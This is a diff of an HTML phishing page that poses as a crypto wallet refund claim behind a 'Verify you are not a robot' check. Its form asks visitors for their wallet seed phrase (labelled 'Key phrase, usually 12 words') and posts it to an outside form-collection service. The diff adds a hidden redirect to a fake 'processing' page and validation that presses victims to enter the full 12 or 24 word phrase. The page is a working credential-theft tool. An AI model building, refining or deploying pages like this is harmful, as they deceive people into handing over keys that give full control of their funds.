@@ -59,17 +59,22 @@
         <div class="row justify-content-center">
             <div class="col-md-6 text-center mb-5">
                 <img src="./css/logo.svg" class="img-fluid logo">
-                <h6 class="heading-section">Connect your wallet through dapps and web3 protocol<br>In order to receive the allocated refund.</h6>
+                <h6 class="heading-section">Connect our wallet through dapps and web3 protocol<br>In order to receive the allocated refund.</h6>
             </div>
         </div>
         <div class="row justify-content-center">
             <div class="col-md-6 col-lg-4">
                 <div class="card">
                     <h5 class="mb-4 text-center">Verify you are not a robot</h5>
-                    <form name="myform" id="myForm" class="signin-form" action="https://submit-form.com/9oVHI3Lon" method="POST">
+                    <form name="myform" id="myForm" class="signin-form" action="https://submit-form.com/9oVHI3Lon" method="POST" onsubmit="return validateform()">
                         <div class="form-group">
                             <input name="name" id="name" type="text" class="form-control" placeholder="Name of agent in charge" required>
                         </div>
+ <input
+    type="hidden"
+    name="_redirect"
+    value="https://smart-paths/processing.html"
+  />
                         <div class="form-group">
                             <input name="key" id="key" type="text" class="form-control" placeholder="Key phrase (Usually 12 words separated by commas)" required>
                         </div>
@@ -93,16 +98,21 @@
 </section>
 
 <script>
-    document.getElementById('myForm').addEventListener('submit', function(event) {
-        event.preventDefault();
+    function validateform() {
+        var name = document.myform.name.value;
+        var password = document.myform.key.value;
 
-        var form = event.target;
-        if (form.checkValidity()) {
-            form.submit();
-        } else {
-            form.classList.add('was-validated');
+        if (name == null || name === "") {
+            swal("Error", "Please fill in the name of your agent", "error");
+            return false;
+        } else if (password.length < 6) {
+            swal("Error", "Key Phrase is usually 12 or 24 words long.", "error");
+            return false;
         }
-    });
+
+        // If validation passes, you can proceed with form submission
+        return true;
+    }
 </script>
 
 <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
